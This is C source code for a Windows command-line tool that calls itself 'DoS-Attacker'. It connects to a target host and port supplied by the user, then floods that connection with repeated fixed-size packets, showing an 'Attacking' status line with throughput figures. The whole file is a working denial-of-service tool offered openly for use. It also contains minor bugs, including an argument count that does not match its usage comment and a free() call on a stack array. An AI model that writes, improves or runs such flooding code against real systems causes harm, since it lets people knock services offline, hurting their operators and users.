#include <stdio.h>
#include <stdlib.h>
#include <WinSock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <conio.h>
#include <time.h>
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

void ErrChk(int code, const char* func)
{
	if (code == SOCKET_ERROR)
	{
		printf("Error %x in function %s\n", WSAGetLastError(), func);
		exit(-1);
	}
}

struct DoSInfo
{
	SOCKET* sock;
	void* pkg;
	size_t pkg_size;
	DWORD delay;
};

static size_t data = 0, pings = 0;
static UINT exit_code = -1;

DWORD WINAPI DoSThread(LPVOID lParam)
{
	const DoSInfo* info = (DoSInfo*)lParam;
	DWORD res;
	long long sent;
	while (1)
	{
		data += sent = send(*(info->sock), (char*)(info->pkg), info->pkg_size, 0);
		pings++;
		if (sent <= 0)
		{
			res = WSAGetLastError();
			switch(res)
			{
			case WSAECONNABORTED:
				puts("\nA WSAECONNABORTED error has occord.\nA software in your PC has closed the connection.");
				break;
			case WSAECONNRESET:
				puts("\nA WSAECONNRESET error has occord.\nThe remote host has closed the connection.");
				break;
			case WSAECONNREFUSED:
				puts("\nA WSAECONNREFUSED error has occord.\nThe remote host refused to the connection.");
				break;
			default:
				printf("\nUnknown error \'%u\' has occord.\n", res);
			}
			exit(-1);
		}

		if (info->delay)
			Sleep(info->delay);
	}
	return 0;
}

void cls(HANDLE hConsole)
{
	COORD coordScreen = { 0, 0 };    // home for the cursor 
	DWORD cCharsWritten;
	CONSOLE_SCREEN_BUFFER_INFO csbi;
	DWORD dwConSize;

	// Get the number of character cells in the current buffer. 

	if (!GetConsoleScreenBufferInfo(hConsole, &csbi))
	{
		return;
	}

	dwConSize = csbi.dwSize.X * csbi.dwSize.Y;

	// Fill the entire screen with blanks.

	if (!FillConsoleOutputCharacter(hConsole,        // Handle to console screen buffer 
		(TCHAR) ' ',     // Character to write to the buffer
		dwConSize,       // Number of cells to write 
		coordScreen,     // Coordinates of first cell 
		&cCharsWritten))// Receive number of characters written
	{
		return;
	}

	// Get the current text attribute.

	if (!GetConsoleScreenBufferInfo(hConsole, &csbi))
	{
		return;
	}

	// Set the buffer's attributes accordingly.

	if (!FillConsoleOutputAttribute(hConsole,         // Handle to console screen buffer 
		csbi.wAttributes, // Character attributes to use
		dwConSize,        // Number of cells to set attribute 
		coordScreen,      // Coordinates of first cell 
		&cCharsWritten)) // Receive number of characters written
	{
		return;
	}

	// Put the cursor at its home coordinates.

	SetConsoleCursorPosition(hConsole, coordScreen);
}

DWORD WINAPI SpeedThread(LPVOID lParam)
{
	time_t t = time(0);
	HANDLE outh = GetStdHandle(STD_OUTPUT_HANDLE);
	while (1)
	{
		while (t == time(0));
		cls(outh);
		printf("Attacking: %s\nSpeed rate: %.2fMbps or %.3fMBps\nPings rate: %llu\nPress CTRL+C to stop.", (char*)lParam, (double)data * 8 / 1024 / 1024, (double)data / 1024 / 1024, pings);
		data = 0;
		pings = 0;
		t = time(0);
	}
	return 0;
}

int main(int argc,char**argv)
{
	//Dos_Attacker target_ip service_name package_size threads_num delay

	BYTE* buff = NULL;
	SOCKET sock = INVALID_SOCKET;
	addrinfo victim = { 0 }, * result = NULL;
	victim.ai_family = AF_UNSPEC;
	victim.ai_socktype = SOCK_STREAM;
	victim.ai_protocol = IPPROTO_TCP;
	WSADATA wsa;
	DWORD delay = 0;
	size_t pkg_size = 1;
	HANDLE threads[2];

	if (argc != 5)
	{
		puts("Check https://github.com/SKC-Developer/DoS-Attacker.git for usage.");
		return 0;
	}

	pkg_size = _atoi64(argv[3]);
	if (pkg_size <= 0 || pkg_size > SO_MAX_MSG_SIZE)
	{
		printf("Invalid package size.\nPackage size should be less than %u", SO_MAX_MSG_SIZE);
		return -1;
	}
	buff = (BYTE*)malloc(pkg_size+1);
	if (!buff)
	{
		puts("Allocation error.");
		return -1;
	}
	buff[pkg_size] = 0;
	for (size_t l = 0; l < pkg_size; l++)
	{
		buff[l] = 'h';
	}

	delay = atoi(argv[4]);

	printf("You have chose to attack \'%s:%s\' with a package size of %llu and a delay of %llu.\nContinue? ", argv[1], argv[2], (unsigned long long)pkg_size, (unsigned long long)delay);
	if (getchar() != 'y')return -1;

	ErrChk(WSAStartup(MAKEWORD(2, 2), &wsa), "WSAStartup");

	INT res = getaddrinfo(argv[1], argv[2], &victim, &result);
	if (res)
		printf("%d\n", res);

	for (addrinfo* ptr = result; ptr != NULL; ptr = ptr->ai_next)
	{
		sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (sock == INVALID_SOCKET)
		{
			puts("Error in creating socket");
			return -1;
		}
		if (connect(sock, ptr->ai_addr, ptr->ai_addrlen) == SOCKET_ERROR)
		{
			closesocket(sock);
			sock = INVALID_SOCKET;
			continue;
		}
		break;
	}

	if (sock == INVALID_SOCKET)
	{
		puts("Unable to connect to the server.");
		return -1;
	}

	DoSInfo info = { &sock, buff, pkg_size, delay };
	threads[0] = CreateThread(NULL, 0, DoSThread, &info, 0, NULL);
	threads[1] = CreateThread(NULL, 0, SpeedThread, argv[1], 0, NULL);
	if (!threads[0] || !threads[1])
	{
		puts("Error in creating the threads.");
		return -1;
	}

	//wait for the CTRL+C
	MSG msg;
	while (GetMessage(&msg,NULL,NULL,NULL))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	CloseHandle(threads[0]);
	CloseHandle(threads[1]);

	closesocket(sock);
	WSACleanup();
	free(threads);

	return 0;
}